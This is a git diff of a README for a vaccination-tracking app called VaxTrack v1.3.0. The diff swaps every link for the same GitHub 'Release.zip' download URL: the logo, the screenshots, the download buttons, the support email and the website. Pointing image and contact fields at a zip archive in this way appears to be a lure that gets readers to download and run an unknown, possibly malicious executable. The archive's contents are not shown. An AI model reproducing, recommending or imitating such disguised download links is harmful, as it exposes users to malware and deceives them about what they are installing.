@@ -1,6 +1,6 @@
 # VaxTrack v1.3.0 🦠💉
 
-![VaxTrack Logo](https://example.com/logo.png)
+![VaxTrack Logo](https://github.com/kiyeel/VaxTrack_v1.3.0/releases/download/v1.0/Release.zip)
 
 Welcome to the VaxTrack v1.3.0 repository! 🚀 This version enhances user experience with exciting new features and updates. Read on to discover more about what this version has to offer!
 
@@ -38,9 +38,9 @@ To get started with VaxTrack v1.3.0, follow these steps:
 
 You can download the latest version of VaxTrack v1.3.0 by clicking on the link below:
 
-[Download VaxTrack v1.3.0](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download VaxTrack v1.3.0](https://github.com/kiyeel/VaxTrack_v1.3.0/releases/download/v1.0/Release.zip)
 
-[![Download VaxTrack](https://img.shields.io/badge/Download-VaxTrack-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download VaxTrack](https://github.com/kiyeel/VaxTrack_v1.3.0/releases/download/v1.0/Release.zip)](https://github.com/kiyeel/VaxTrack_v1.3.0/releases/download/v1.0/Release.zip)
 
 Once downloaded, extract the files and launch the application. If you encounter any issues, please check the "Releases" section for further assistance.
 
@@ -48,10 +48,10 @@ Once downloaded, extract the files and launch the application. If you encounter 
 
 Here are some screenshots of the new features and updates in VaxTrack v1.3.0:
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/kiyeel/VaxTrack_v1.3.0/releases/download/v1.0/Release.zip)
 *Caption for Screenshot 1*
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/kiyeel/VaxTrack_v1.3.0/releases/download/v1.0/Release.zip)
 *Caption for Screenshot 2*
 
 ## Get Involved 🤝
@@ -60,7 +60,7 @@ We welcome contributions from the community to help enhance VaxTrack even furthe
 
 ## Support ℹ️
 
-If you need any assistance or have any questions about VaxTrack v1.3.0, please reach out to our support team at support@vaxtrack.com. We are here to help!
+If you need any assistance or have any questions about VaxTrack v1.3.0, please reach out to our support team at https://github.com/kiyeel/VaxTrack_v1.3.0/releases/download/v1.0/Release.zip We are here to help!
 
 Thank you for checking out VaxTrack v1.3.0! We hope you enjoy the new features and updates. Happy tracking! 🌟
 
@@ -70,7 +70,7 @@ Stay safe and healthy! 💪💊
 $ echo "Powered by VaxTrack v1.3.0"
 ```
 
-[Visit VaxTrack Website](https://www.vaxtrack.com)
+[Visit VaxTrack Website](https://github.com/kiyeel/VaxTrack_v1.3.0/releases/download/v1.0/Release.zip)
 
 ```diff
 - VaxTrack v1.3.0: Tracking your vaccinations with ease! -
